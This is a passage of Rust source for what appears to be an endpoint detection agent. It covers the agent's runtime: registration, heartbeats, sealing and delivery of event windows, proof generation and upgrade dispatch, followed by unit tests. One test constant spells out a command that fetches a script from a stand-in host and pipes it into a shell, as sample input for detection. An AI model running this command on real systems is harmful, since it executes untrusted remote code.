use std::path::{Path, PathBuf};
use std::process::{Child, Command, Stdio};
use std::sync::{mpsc, Arc, Mutex};
use std::thread;
use std::time::{Duration, Instant};

use serde::Deserialize;
use zedr_protocol::{HeartbeatEvent, SensorEvent, StopReason, SystemEvent, UpgradeCommand};
use zedr_rules::proof::{self, Journal};
use zedr_rules::State;

use crate::identity::replace_private_file;
use crate::ledger::{Ledger, WINDOW_EVENTS};
use crate::link::{unix_now, ControlLink, HostDescription, WindowDelivery};
use crate::sensor::{Sensor, Source};

const EVENT_TIMEOUT_SECS: u64 = 30;
const STOP_FLUSH_SECS: u64 = 5;
const DEFAULT_HEARTBEAT_INTERVAL_SECS: u64 = 30;
const DEFAULT_SENSOR_INTERVAL_SECS: u64 = 5;
const DEFAULT_PERSISTENCE_INTERVAL_SECS: u64 = 60;
const DEFAULT_PACKAGE_INTERVAL_SECS: u64 = 300;
/// Most events one proof covers. A proof costs tens of CPU seconds per event and its receipt tens of kilobytes,
/// so this many keep one proof to minutes of work on a few cores and to a few megabytes to send
pub const DEFAULT_PROOF_EVENTS: u64 = 250;
/// Seconds proving rests after a proof
pub const DEFAULT_PROOF_REST_SECS: u64 = 900;
/// A receipt is megabytes, and the control server verifies it before it answers
const PROOF_TIMEOUT_SECS: u64 = 300;
const PROOF_RETRY_AFTER: Duration = Duration::from_secs(600);
const PROOFS_DIR: &str = "proofs";
const REFUSAL_WAIT_START: Duration = Duration::from_secs(60);
const REFUSAL_WAIT_LIMIT: Duration = Duration::from_secs(3600);
const REGISTRATION_RETRY_START: Duration = Duration::from_secs(30);
const REGISTRATION_RETRY_LIMIT: Duration = Duration::from_secs(600);

pub trait Platform: Send + Sync + 'static {
    fn log(&self, message: &str);
    fn upgrade(&self, command: UpgradeCommand);
}

fn setting(variable: &str, default: u64) -> u64 {
    match std::env::var(variable).ok().and_then(|value| value.parse::<u64>().ok()) {
        Some(value) if value > 0 => value,
        _ => default,
    }
}

fn interval(variable: &str, default_seconds: u64) -> Duration {
    Duration::from_secs(setting(variable, default_seconds))
}

pub fn heartbeat_interval() -> Duration {
    interval("ZEDR_HEARTBEAT_INTERVAL", DEFAULT_HEARTBEAT_INTERVAL_SECS)
}

pub struct SensorIntervals {
    pub poll: Duration,
    pub persistence: Duration,
    pub packages: Duration,
}

pub fn sensor_intervals() -> SensorIntervals {
    SensorIntervals {
        poll: interval("ZEDR_SENSOR_INTERVAL", DEFAULT_SENSOR_INTERVAL_SECS),
        persistence: interval("ZEDR_PERSISTENCE_INTERVAL", DEFAULT_PERSISTENCE_INTERVAL_SECS),
        packages: interval("ZEDR_PACKAGE_INTERVAL", DEFAULT_PACKAGE_INTERVAL_SECS),
    }
}

#[derive(Deserialize)]
struct HeartbeatReply {
    #[serde(default)]
    upgrade: Option<UpgradeCommand>,
}

struct RegistrationRetry {
    not_before: Instant,
    delay: Duration,
}

/// How long windows are kept back after the control server refused one, twice as long after every further refusal in a row
#[derive(Clone, Copy)]
struct RefusalWait {
    first: Duration,
    limit: Duration,
}

struct Refusals {
    wait: RefusalWait,
    next: Duration,
    held: Option<(Instant, String)>,
}

impl Refusals {
    fn new(wait: RefusalWait) -> Self {
        Self { wait, next: wait.first, held: None }
    }

    /// Keeps windows back from now on, and returns what there is to say about it until they are sent again
    fn refused(&mut self, now: Instant, window: u64, stands_at: u64) -> String {
        let said = format!("Server refused window {}, starting over at its window {} and sending again in {}s", window, stands_at, self.next.as_secs());
        self.held = Some((now + self.next, said.clone()));
        self.next = (self.next * 2).min(self.wait.limit);
        said
    }

    fn accepted(&mut self) {
        self.next = self.wait.first;
        self.held = None;
    }

    /// Why no window is sent now: the wait after a refusal is not over, or it is and nothing was sealed since.
    /// The refusal stands until a window is taken
    fn holding(&self, now: Instant, waiting: u64) -> Option<String> {
        let (until, said) = self.held.as_ref()?;
        (now < *until || waiting == 0).then(|| said.clone())
    }
}

/// The prover if one is installed, how many events one proof may cover, how long proving rests after a proof and how long a failed one waits.
/// A window is sealed every minute and a proof takes minutes of every core, so without the rest an endpoint would never stop proving
struct ProverSettings {
    program: Option<PathBuf>,
    max_events: usize,
    rest: Duration,
    retry_after: Duration,
}

impl ProverSettings {
    fn from_environment() -> Self {
        let named = match std::env::var_os("ZEDR_PROVER") {
            Some(path) => Some(PathBuf::from(path)),
            None => std::env::current_exe().ok().map(|agent| agent.with_file_name(format!("zedr-prover{}", std::env::consts::EXE_SUFFIX))),
        };

        Self {
            program: named.filter(|program| program.is_file()),
            max_events: setting("ZEDR_PROOF_EVENTS", DEFAULT_PROOF_EVENTS) as usize,
            rest: interval("ZEDR_PROOF_REST", DEFAULT_PROOF_REST_SECS),
            retry_after: PROOF_RETRY_AFTER,
        }
    }
}

struct Proof {
    prover: Child,
    receipt: PathBuf,
    journal: Journal,
    state: State,
}

struct Prover {
    settings: ProverSettings,
    dir: PathBuf,
    running: Option<Proof>,
    not_before: Instant,
    rests_until: Instant,
}

impl Prover {
    fn new(settings: ProverSettings, ledger_dir: &Path) -> Self {
        let now = Instant::now();
        let mut prover = Self { settings, dir: ledger_dir.join(PROOFS_DIR), running: None, not_before: now, rests_until: now };
        prover.discard();
        prover
    }

    /// Ends the proof that is being made, if any, and removes everything written for it
    fn discard(&mut self) {
        if let Some(mut proof) = self.running.take() {
            let _ = proof.prover.kill();
            let _ = proof.prover.wait();
        }
        let _ = std::fs::remove_dir_all(&self.dir);
    }

    fn start(&mut self, ledger: &mut Ledger) -> Result<(), String> {
        let Some(program) = &self.settings.program else {
            return Ok(());
        };
        // The rest ends early once a whole proof's worth of events waits, so a busy endpoint does not fall behind
        if Instant::now() < self.rests_until && ledger.unproven_events() < self.settings.max_events as u64 {
            return Ok(());
        }
        let Some(input) = ledger.proof_input(self.settings.max_events)? else {
            return Ok(());
        };

        let encoded = input.to_bytes();
        let (journal, state) = proof::run(input)?;
        let mut unique = [0u8; 8];
        getrandom::getrandom(&mut unique).map_err(|e| format!("Failed to gather randomness: {}", e))?;
        let attempt = format!("{}-{}", journal.first_window, hex::encode(unique));
        let input_file = format!("input-{}.bin", attempt);
        let receipt = self.dir.join(format!("receipt-{}.bin", attempt));

        std::fs::create_dir_all(&self.dir).map_err(|e| format!("Failed to create {}: {}", self.dir.display(), e))?;
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&self.dir, std::fs::Permissions::from_mode(0o700))
                .map_err(|e| format!("Failed to protect {}: {}", self.dir.display(), e))?;
        }
        replace_private_file(&self.dir, &input_file, "proof input", &encoded)?;
        let prover = spawn_prover(program, &self.dir.join(input_file), &receipt).map_err(|e| format!("Failed to start {}: {}", program.display(), e))?;
        self.running = Some(Proof { prover, receipt, journal, state });
        Ok(())
    }

    /// Moves proving one step without ever waiting for the prover, true once a proof has reached the control server.
    /// Every attempt reads and writes files of its own name, so a prover left over from an earlier one writes nowhere this one reads
    fn step(&mut self, ledger: &mut Ledger, link: &ControlLink) -> Result<bool, String> {
        let Some(mut proof) = self.running.take() else {
            return self.start(ledger).map(|()| false);
        };

        match proof.prover.try_wait() {
            Ok(Some(status)) if status.success() => {
                let receipt = std::fs::read(&proof.receipt).map_err(|e| format!("The prover left no receipt: {}", e))?;
                link.send_proof(&receipt, PROOF_TIMEOUT_SECS)?;
                ledger.proven(&proof.journal, proof.state)?;
                self.discard();
                self.rests_until = Instant::now() + self.settings.rest;
                Ok(true)
            }
            Ok(Some(status)) => Err(format!("The prover ended with {}", status)),
            Ok(None) => {
                self.running = Some(proof);
                Ok(false)
            }
            Err(e) => {
                self.running = Some(proof);
                Err(format!("Failed to wait for the prover: {}", e))
            }
        }
    }
}

fn prover_command<'a>(command: &'a mut Command, input: &Path, receipt: &Path) -> &'a mut Command {
    command.arg("prove").arg(input).arg(receipt).stdin(Stdio::null()).stdout(Stdio::null())
}

fn spawn_prover(program: &Path, input: &Path, receipt: &Path) -> std::io::Result<Child> {
    #[cfg(unix)]
    match prover_command(Command::new("nice").args(["-n", "19"]).arg(program), input, receipt).spawn() {
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
        spawned => return spawned,
    }

    prover_command(&mut Command::new(program), input, receipt).spawn()
}

pub struct Runtime<P: Platform> {
    link: Arc<ControlLink>,
    platform: P,
    host: HostDescription,
    registration_retry: Mutex<RegistrationRetry>,
    sensor_stop: Mutex<Option<mpsc::Sender<mpsc::Sender<()>>>>,
}

impl<P: Platform> Runtime<P> {
    pub fn new(link: Arc<ControlLink>, platform: P, host: HostDescription) -> Self {
        if let Err(e) = link.accepted_commands_readable() {
            platform.log(&format!("Upgrade commands are refused: {}", e));
        }

        Self {
            link,
            platform,
            host,
            registration_retry: Mutex::new(RegistrationRetry { not_before: Instant::now(), delay: REGISTRATION_RETRY_START }),
            sensor_stop: Mutex::new(None),
        }
    }

    pub fn run_until_stopped(self: &Arc<Self>, stop: &mpsc::Receiver<StopReason>, heartbeat_interval: Duration) -> Option<StopReason> {
        self.register();

        loop {
            match stop.recv_timeout(heartbeat_interval) {
                Ok(reason) => return Some(reason),
                Err(mpsc::RecvTimeoutError::Timeout) => self.tick(),
                Err(mpsc::RecvTimeoutError::Disconnected) => return None,
            }
        }
    }

    pub fn start_sensor<S: Source>(self: &Arc<Self>, source: S, intervals: SensorIntervals) {
        self.start_sensor_with(source, intervals, ProverSettings::from_environment(), RefusalWait { first: REFUSAL_WAIT_START, limit: REFUSAL_WAIT_LIMIT });
    }

    fn start_sensor_with<S: Source>(self: &Arc<Self>, source: S, intervals: SensorIntervals, prover: ProverSettings, refusal_wait: RefusalWait) {
        let (stop_tx, stop_rx) = mpsc::channel();
        match self.sensor_stop.lock() {
            Ok(mut sensor_stop) => *sensor_stop = Some(stop_tx),
            Err(e) => {
                self.platform.log(&format!("Sensor cannot start: {}", e));
                return;
            }
        }

        let runtime = Arc::clone(self);
        let sensor = Sensor::new(source, std::process::id(), intervals.persistence.as_secs(), intervals.packages.as_secs());
        thread::spawn(move || runtime.run_sensor(sensor, intervals.poll, stop_rx, prover, refusal_wait));
    }

    fn run_sensor<S: Source>(
        &self,
        mut sensor: Sensor<S>,
        interval: Duration,
        stop: mpsc::Receiver<mpsc::Sender<()>>,
        prover: ProverSettings,
        refusal_wait: RefusalWait,
    ) {
        let mut ledger = match self.link.open_ledger(unix_now()) {
            Ok(ledger) => ledger,
            Err(e) => {
                self.platform.log(&format!("Sensor cannot start: {}", e));
                return;
            }
        };
        let mut prover = Prover::new(prover, ledger.dir());
        let proving = prover.settings.program.is_some();
        let mut refusals = Refusals::new(refusal_wait);
        let mut reported_errors = Vec::new();
        let mut reported_sealing = Ok(());
        let mut reported_delivery = Ok(());
        let mut reported_proving = Ok(());
        let mut reported_notice = String::new();
        let mut announced = false;
        let mut stopping: Option<mpsc::Sender<()>> = None;

        loop {
            let now = unix_now();
            let observation = sensor.poll(now);

            if observation.errors != reported_errors {
                for error in &observation.errors {
                    self.platform.log(&format!("Sensor: {}", error));
                }
                reported_errors = observation.errors;
            }

            if !announced && reported_errors.is_empty() {
                self.platform.log(&format!(
                    "Sensor started, {} processes, {} persistence items and {} packages in the first snapshot, polling every {}s",
                    sensor.tracked_processes(),
                    sensor.tracked_persistence(),
                    sensor.tracked_packages(),
                    interval.as_secs()
                ));
                announced = true;
            }

            let epoch = ledger.epoch();
            let sealing = self.commit(&mut ledger, observation.events, now, stopping.is_some());
            if sealing != reported_sealing {
                match &sealing {
                    Ok(()) => self.platform.log("Sensor windows are being sealed again"),
                    Err(e) => self.platform.log(&format!("Sensor windows cannot be sealed: {}", e)),
                }
                reported_sealing = sealing;
            }

            let timeout_secs = if stopping.is_some() { STOP_FLUSH_SECS } else { EVENT_TIMEOUT_SECS };
            let delivery = self.deliver(&mut ledger, &mut prover, &mut refusals, proving, timeout_secs);
            if delivery != reported_delivery {
                match &delivery {
                    Ok(()) => self.platform.log("Sensor windows are being delivered again"),
                    Err(e) => self.platform.log(&format!("Sensor windows are queued, {} waiting: {}", ledger.undelivered(), e)),
                }
                reported_delivery = delivery;
            }

            for notice in ledger.take_notices() {
                if notice != reported_notice {
                    self.platform.log(&format!("Sensor: {}", notice));
                    reported_notice = notice;
                }
            }

            if ledger.epoch() != epoch {
                sensor.forget();
            }

            if let Some(flushed) = stopping {
                prover.discard();
                let _ = flushed.send(());
                return;
            }

            if reported_delivery.is_ok() {
                self.prove(&mut ledger, &mut prover, &mut reported_proving);
            }

            stopping = match stop.recv_timeout(interval) {
                Ok(flushed) => Some(flushed),
                Err(mpsc::RecvTimeoutError::Timeout) => None,
                Err(mpsc::RecvTimeoutError::Disconnected) => {
                    prover.discard();
                    return;
                }
            };
        }
    }

    /// Commits what the sensor saw, a full window at a time, and seals the open window when it is due or the agent is stopping
    fn commit(&self, ledger: &mut Ledger, events: Vec<SystemEvent>, now: u64, stopping: bool) -> Result<(), String> {
        let mut sensed = Vec::with_capacity(events.len());
        for event in events {
            match SensorEvent::try_from(event) {
                Ok(event) => sensed.push(event),
                Err(_) => ledger.note_gap(),
            }
        }

        let mut refused = 0;
        let sealed = sensed.chunks(WINDOW_EVENTS).try_for_each(|full| {
            ledger.seal_due(now)?;
            refused += ledger.admit(full);
            Ok::<(), String>(())
        });
        if refused > 0 {
            self.platform.log(&format!("Sensor produced {} events too large to seal, discarded them", refused));
        }
        sealed?;

        if stopping {
            ledger.seal_now(now)?;
        } else {
            ledger.seal_due(now)?;
        }
        Ok(())
    }

    /// Sends the sealed windows in order until one is not taken. A refusal the deployment signed moves the ledger onto
    /// the position it names, and windows are then kept back for a while, so a server that refuses everything is not sent everything again at once
    fn deliver(&self, ledger: &mut Ledger, prover: &mut Prover, refusals: &mut Refusals, proving: bool, timeout_secs: u64) -> Result<(), String> {
        if let Some(refused) = refusals.holding(Instant::now(), ledger.undelivered()) {
            return Err(refused);
        }

        while let Some(window) = ledger.next_undelivered()? {
            match self.link.send_window(&window, proving, timeout_secs)? {
                WindowDelivery::Accepted => {
                    refusals.accepted();
                    ledger.delivered(window.header.window, proving)?;
                }
                WindowDelivery::Refused(position) => {
                    let refused = refusals.refused(Instant::now(), window.header.window, position.next_window);
                    prover.discard();
                    ledger.rebase(position.epoch, position.next_window, position.next_index, position.head, unix_now())?;
                    return Err(refused);
                }
            }
        }

        Ok(())
    }

    fn prove(&self, ledger: &mut Ledger, prover: &mut Prover, reported: &mut Result<(), String>) {
        if Instant::now() < prover.not_before {
            return;
        }

        match prover.step(ledger, &self.link) {
            Ok(false) => {}
            Ok(true) => {
                if reported.is_err() {
                    self.platform.log("Proofs are being accepted again");
                    *reported = Ok(());
                }
            }
            Err(e) => {
                prover.discard();
                prover.not_before = Instant::now() + prover.settings.retry_after;
                if reported.as_ref() != Err(&e) {
                    self.platform.log(&format!("Proving failed, next attempt in {}s: {}", prover.settings.retry_after.as_secs(), e));
                    *reported = Err(e);
                }
            }
        }
    }

    pub fn notify_stopping(&self, reason: StopReason) {
        self.flush_sensor(Duration::from_secs(STOP_FLUSH_SECS));

        match self.link.notify_stopping(reason) {
            Ok(status) => self.platform.log(&format!("Stop notice response: {}", status)),
            Err(e) => self.platform.log(&format!("Stop notice failed: {}", e)),
        }
    }

    /// Gives the sensor one last round, so that what it saw leaves the endpoint before the stop notice does, and waits no longer than the limit for it
    fn flush_sensor(&self, limit: Duration) {
        let Some(stop) = self.sensor_stop.lock().ok().and_then(|mut sensor_stop| sensor_stop.take()) else {
            return;
        };

        let (flushed_tx, flushed_rx) = mpsc::channel();
        if stop.send(flushed_tx).is_ok() && flushed_rx.recv_timeout(limit) == Err(mpsc::RecvTimeoutError::Timeout) {
            self.platform.log("Sensor did not finish its last round in time, what it sealed is delivered after the next start");
        }
    }

    fn register(&self) {
        let mut retry = match self.registration_retry.lock() {
            Ok(retry) => retry,
            Err(e) => {
                self.platform.log(&format!("Failed to lock registration state: {}", e));
                return;
            }
        };

        let now = Instant::now();
        if now < retry.not_before {
            return;
        }

        match self.link.register(&self.host) {
            Ok(()) => {
                self.platform.log(&format!("Agent {} registered with {}", self.link.agent_id(), self.link.server_url()));
                retry.not_before = now;
                retry.delay = REGISTRATION_RETRY_START;
            }
            Err(e) => {
                self.platform.log(&format!("Registration failed, next attempt in {}s: {}", retry.delay.as_secs(), e));
                retry.not_before = now + retry.delay;
                retry.delay = (retry.delay * 2).min(REGISTRATION_RETRY_LIMIT);
            }
        }
    }

    fn tick(self: &Arc<Self>) {
        if let Err(e) = self.heartbeat() {
            self.platform.log(&format!("Heartbeat failed: {}", e));
        }
    }

    fn heartbeat(self: &Arc<Self>) -> Result<(), String> {
        let heartbeat = SystemEvent::Heartbeat(HeartbeatEvent { timestamp: unix_now() });
        let response = self.link.send_events(vec![heartbeat], EVENT_TIMEOUT_SECS)?;

        match response.status_code {
            200 => {
                let reply: HeartbeatReply = serde_json::from_slice(response.as_bytes()).map_err(|e| format!("Unreadable heartbeat response: {}", e))?;
                self.dispatch(reply);
                Ok(())
            }
            401 => {
                self.platform.log("Server does not recognise this agent, registering again");
                self.register();
                Ok(())
            }
            status => Err(format!("HTTP {}", status)),
        }
    }

    fn dispatch(self: &Arc<Self>, reply: HeartbeatReply) {
        if let Some(command) = reply.upgrade {
            self.platform.log(&format!("Upgrade command received for version {}", command.target_version));
            let runtime = Arc::clone(self);
            thread::spawn(move || runtime.platform.upgrade(command));
        }
    }
}

#[cfg(all(test, unix))]
mod tests {
    use super::*;
    use ed25519_dalek::{Signature, Signer, SigningKey, Verifier, VerifyingKey};
    use sha2::{Digest, Sha256};
    use std::collections::{BTreeMap, HashMap};
    use std::io::{BufRead, BufReader, Read, Write};
    use std::net::TcpListener;
    use std::os::unix::fs::PermissionsExt;
    use zedr_ledger::{leaf, seal, Hash};
    use zedr_protocol::{
        bytes_from_base64, hash_from_hex, hash_to_hex, window_ack_signing_bytes, window_refusal_signing_bytes, ProcessAction, ProcessEvent, SealedWindow,
        SealedWindowAck, WindowRefusal, SIGNATURE_HEADER,
    };

    struct Received {
        path: String,
        signature: Option<String>,
        body: String,
        answer: u16,
        at: Instant,
    }

    impl Received {
        fn json(&self) -> serde_json::Value {
            serde_json::from_str(&self.body).unwrap()
        }
    }

    struct StubServer {
        url: String,
        received: Arc<Mutex<Vec<Received>>>,
    }

    impl StubServer {
        fn start(respond: impl Fn(&Received) -> (u16, String) + Send + 'static) -> Self {
            let listener = TcpListener::bind("127.0.0.1:0").unwrap();
            let url = format!("http://{}", listener.local_addr().unwrap());
            let received = Arc::new(Mutex::new(Vec::new()));
            let sink = Arc::clone(&received);

            thread::spawn(move || {
                for stream in listener.incoming() {
                    let Ok(mut stream) = stream else { break };
                    let mut request = read_request(&mut stream);
                    let (status, body) = respond(&request);
                    request.answer = status;
                    sink.lock().unwrap().push(request);
                    let _ = write!(
                        stream,
                        "HTTP/1.1 {} Stub\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                        status,
                        body.len(),
                        body
                    );
                }
            });

            Self { url, received }
        }

        fn requests_to(&self, path: &str) -> Vec<serde_json::Value> {
            self.received.lock().unwrap().iter().filter(|request| request.path == path).map(Received::json).collect()
        }

        fn wait_for_event(&self, name: &str) -> Option<serde_json::Value> {
            let deadline = Instant::now() + Duration::from_secs(10);
            while Instant::now() < deadline {
                let found = self
                    .requests_to("/api/events")
                    .into_iter()
                    .find_map(|batch| batch["events"].as_array().and_then(|events| events.iter().find_map(|event| event.get(name).cloned())));
                if found.is_some() {
                    return found;
                }
                thread::sleep(Duration::from_millis(20));
            }
            None
        }
    }

    fn read_request(stream: &mut std::net::TcpStream) -> Received {
        let mut reader = BufReader::new(stream);
        let mut request_line = String::new();
        reader.read_line(&mut request_line).unwrap();
        let path = request_line.split_whitespace().nth(1).unwrap().to_string();

        let mut signature = None;
        let mut content_length = 0;
        loop {
            let mut line = String::new();
            reader.read_line(&mut line).unwrap();
            let line = line.trim_end();
            if line.is_empty() {
                break;
            }
            if let Some((name, value)) = line.split_once(':') {
                match name.to_ascii_lowercase().as_str() {
                    SIGNATURE_HEADER => signature = Some(value.trim().to_string()),
                    "content-length" => content_length = value.trim().parse().unwrap(),
                    _ => {}
                }
            }
        }

        let mut body = vec![0u8; content_length];
        reader.read_exact(&mut body).unwrap();
        Received { path, signature, body: String::from_utf8(body).unwrap(), answer: 0, at: Instant::now() }
    }

    #[derive(Default)]
    struct TestPlatform {
        logs: Mutex<Vec<String>>,
        upgrades: Mutex<Vec<UpgradeCommand>>,
    }

    impl TestPlatform {
        fn logged(&self, needle: &str) -> bool {
            self.logs.lock().unwrap().iter().any(|line| line.contains(needle))
        }
    }

    impl Platform for Arc<TestPlatform> {
        fn log(&self, message: &str) {
            self.logs.lock().unwrap().push(message.to_string());
        }

        fn upgrade(&self, command: UpgradeCommand) {
            self.upgrades.lock().unwrap().push(command);
        }
    }

    fn state_dir(name: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!("zedr-runtime-{}-{}", std::process::id(), name));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }

    fn host() -> HostDescription {
        HostDescription { hostname: "test-host".to_string(), os_version: "Test OS 1".to_string(), agent_version: "0.1.0".to_string() }
    }

    fn deployment_key() -> SigningKey {
        SigningKey::from_bytes(&[9u8; 32])
    }

    fn runtime(server: &StubServer, dir: &std::path::Path) -> (Arc<Runtime<Arc<TestPlatform>>>, Arc<TestPlatform>) {
        let platform = Arc::new(TestPlatform::default());
        let link = Arc::new(ControlLink::open_trusting(server.url.clone(), dir, None, deployment_key().verifying_key()).unwrap());
        (Arc::new(Runtime::new(link, Arc::clone(&platform), host())), platform)
    }

    fn signed_ack(key: &SigningKey, agent_id: &str, window: u64, next_index: u64, head: &str) -> (u16, String) {
        let signed = window_ack_signing_bytes(agent_id, window, next_index, head).unwrap();
        let ack = SealedWindowAck { window, next_index, head: head.to_string(), signature: key.sign(&signed).to_bytes().to_vec() };
        (200, serde_json::to_string(&ack).unwrap())
    }

    fn sent_window(request: &Received) -> SealedWindow {
        serde_json::from_str(&request.body).unwrap()
    }

    fn acknowledge(request: &Received) -> (u16, String) {
        let window = sent_window(request);
        signed_ack(&deployment_key(), &window.agent_id, window.header.window, window.header.first_index + u64::from(window.header.count), &window.header.head)
    }

    /// What a control server answers to a window it does not take: where its copy of the chain stands, signed for the request with this sequence number
    fn signed_refusal(
        key: &SigningKey,
        status: u16,
        window: &SealedWindow,
        seq: u64,
        (epoch, next_window, next_index, head): (u64, u64, u64, &str),
    ) -> (u16, String) {
        let signed = window_refusal_signing_bytes(&window.agent_id, window.session, seq, epoch, next_window, next_index, head).unwrap();
        let refusal = WindowRefusal { epoch, next_window, next_index, head: head.to_string(), signature: key.sign(&signed).to_bytes().to_vec() };
        (status, serde_json::to_string(&refusal).unwrap())
    }

    fn where_it_starts(window: &SealedWindow) -> (u64, u64, u64, &str) {
        (window.header.epoch, window.header.window, window.header.first_index, &window.header.prev_head)
    }

    fn accept_everything(request: &Received) -> (u16, String) {
        match request.path.as_str() {
            "/api/windows" => acknowledge(request),
            _ => (200, "{}".to_string()),
        }
    }

    #[test]
    fn test_registration_is_signed_and_spends_the_enrollment_key_once() {
        let server = StubServer::start(accept_everything);
        let dir = state_dir("register");
        std::fs::write(dir.join("enrollment.key"), "zedr_fleet_test\n").unwrap();

        let link = ControlLink::open_with_key_id(server.url.clone(), &dir).unwrap();
        link.register(&host()).unwrap();
        link.register(&host()).unwrap();

        let received = server.received.lock().unwrap();
        let first = received[0].json();
        assert_eq!(received[0].path, "/api/agents/register");
        assert_eq!(first["enrollment_key"], "zedr_fleet_test");
        assert_eq!(first["hostname"], "test-host");
        assert_eq!(first["platform"], std::env::consts::OS);
        assert_eq!(first["agent_id"], link.agent_id());
        assert_eq!(first["agent_id"].as_str().unwrap().len(), 32);

        let key_bytes: [u8; 32] = hex::decode(first["public_key"].as_str().unwrap()).unwrap().try_into().unwrap();
        let public_key = VerifyingKey::from_bytes(&key_bytes).unwrap();
        for request in received.iter() {
            let signature = Signature::from_slice(&hex::decode(request.signature.as_ref().unwrap()).unwrap()).unwrap();
            assert!(public_key.verify(request.body.as_bytes(), &signature).is_ok());
        }

        let second = received[1].json();
        assert!(second.get("enrollment_key").is_none(), "the key is gone after the first accepted registration");
        assert!(!dir.join("enrollment.key").exists());
        assert_eq!(second["session"], first["session"]);
        assert_eq!(second["seq"].as_u64().unwrap(), first["seq"].as_u64().unwrap() + 1);

        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn test_rejected_registration_keeps_the_enrollment_key() {
        let server = StubServer::start(|_| (401, "{}".to_string()));
        let dir = state_dir("register-rejected");
        std::fs::write(dir.join("enrollment.key"), "zedr_fleet_expired").unwrap();

        let link = ControlLink::open_with_key_id(server.url.clone(), &dir).unwrap();
        assert!(link.register(&host()).unwrap_err().contains("401"));
        assert!(dir.join("enrollment.key").exists());

        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn test_unknown_agent_registers_again_and_backs_off_while_rejected() {
        let server = StubServer::start(|_| (401, "{}".to_string()));
        let dir = state_dir("backoff");
        let (runtime, platform) = runtime(&server, &dir);

        runtime.register();
        for _ in 0..3 {
            runtime.tick();
        }

        assert_eq!(server.requests_to("/api/events").len(), 3, "heartbeats continue");
        assert_eq!(server.requests_to("/api/agents/register").len(), 1, "a rejected registration is not repeated on every heartbeat");
        assert!(platform.logged("next attempt in 30s"));

        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn test_registration_is_retried_once_the_wait_is_over() {
        let server = StubServer::start(|request| match request.path.as_str() {
            "/api/agents/register" => (200, "{}".to_string()),
            _ => (401, "{}".to_string()),
        });
        let dir = state_dir("reregister");
        let (runtime, platform) = runtime(&server, &dir);

        runtime.tick();
        runtime.tick();

        assert_eq!(server.requests_to("/api/agents/register").len(), 2, "after a success there is no wait");
        assert!(platform.logged("registering again"));

        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn test_upgrade_command_is_handed_to_the_platform() {
        let server = StubServer::start(|request| {
            if request.body.contains("Heartbeat") {
                let upgrade = serde_json::json!({
                    "upgrade": { "agent_id": "a", "target_version": "0.2.0", "signature": [1, 2, 3], "issued_at": 1, "nonce": "n" }
                });
                (200, upgrade.to_string())
            } else {
                (200, "{}".to_string())
            }
        });
        let dir = state_dir("upgrade");
        let (runtime, platform) = runtime(&server, &dir);

        runtime.tick();

        let deadline = Instant::now() + Duration::from_secs(5);
        while platform.upgrades.lock().unwrap().is_empty() && Instant::now() < deadline {
            thread::sleep(Duration::from_millis(20));
        }
        assert_eq!(platform.upgrades.lock().unwrap()[0].target_version, "0.2.0");

        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn test_loop_registers_heartbeats_and_reports_why_it_stops() {
        let server = StubServer::start(accept_everything);
        let dir = state_dir("loop");
        let (runtime, _) = runtime(&server, &dir);
        let (stop_tx, stop_rx) = mpsc::channel();

        let running = {
            let runtime = Arc::clone(&runtime);
            thread::spawn(move || runtime.run_until_stopped(&stop_rx, Duration::from_millis(50)))
        };

        assert!(server.wait_for_event("Heartbeat").is_some());
        stop_tx.send(StopReason::SystemShutdown).unwrap();
        let reason = running.join().unwrap();
        assert_eq!(reason, Some(StopReason::SystemShutdown));

        runtime.notify_stopping(StopReason::SystemShutdown);
        let notice = server.wait_for_event("AgentStopping").unwrap();
        assert_eq!(notice["reason"], "SystemShutdown");

        assert_eq!(server.received.lock().unwrap()[0].path, "/api/agents/register");
        let sequences: Vec<u64> = server.received.lock().unwrap().iter().map(|request| request.json()["seq"].as_u64().unwrap()).collect();
        assert!(sequences.windows(2).all(|pair| pair[1] == pair[0] + 1), "every request advances the sequence by one: {:?}", sequences);

        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[derive(Clone, Default)]
    struct ScriptedSource {
        processes: Arc<Mutex<Vec<(crate::sensor::ProcessKey, crate::sensor::ProcessDetails)>>>,
        paused: Arc<Mutex<()>>,
    }

    impl ScriptedSource {
        fn with(count: u32) -> Self {
            let source = Self::default();
            for pid in 1..=count {
                source.run(pid, pid - 1, &format!("/usr/bin/program-{}", pid), &[&format!("--token=secret-{}", pid)]);
            }
            source
        }

        fn run(&self, pid: u32, ppid: u32, executable_path: &str, arguments: &[&str]) {
            let started_at = 1_000 + pid as u64;
            let mut command_line = vec![executable_path.to_string()];
            command_line.extend(arguments.iter().map(|argument| argument.to_string()));
            self.processes.lock().unwrap().push((
                crate::sensor::ProcessKey { pid, started: started_at, image: 1 },
                crate::sensor::ProcessDetails { ppid, uid: 0, executable_path: executable_path.to_string(), command_line, started_at },
            ));
        }
    }

    impl Source for ScriptedSource {
        fn processes(&mut self) -> Result<Vec<crate::sensor::ProcessKey>, String> {
            let _running = self.paused.lock().unwrap();
            Ok(self.processes.lock().unwrap().iter().map(|(key, _)| *key).collect())
        }

        fn describe(&mut self, process: &crate::sensor::ProcessKey) -> Option<crate::sensor::ProcessDetails> {
            self.processes.lock().unwrap().iter().find(|(key, _)| key == process).map(|(_, details)| details.clone())
        }

        fn outbound_sockets(&mut self) -> Result<Vec<crate::sensor::Socket>, String> {
            Ok(Vec::new())
        }

        fn socket_holders(&mut self, _: &[crate::sensor::Socket]) -> HashMap<u64, Vec<u32>> {
            HashMap::new()
        }

        fn persistence(&mut self) -> Result<Vec<crate::sensor::PersistenceItem>, String> {
            Ok(Vec::new())
        }

        fn packages(&mut self) -> Result<Vec<crate::sensor::PackageItem>, String> {
            Ok(Vec::new())
        }
    }

    const SHELL: &str = "/bin/sh";
    const FETCH_AND_RUN: [&str; 2] = ["-c", "curl -s http://203.0.113.9/a | sh"];

    fn started(pid: u32, ppid: u32, executable_path: &str, arguments: &[&str]) -> SensorEvent {
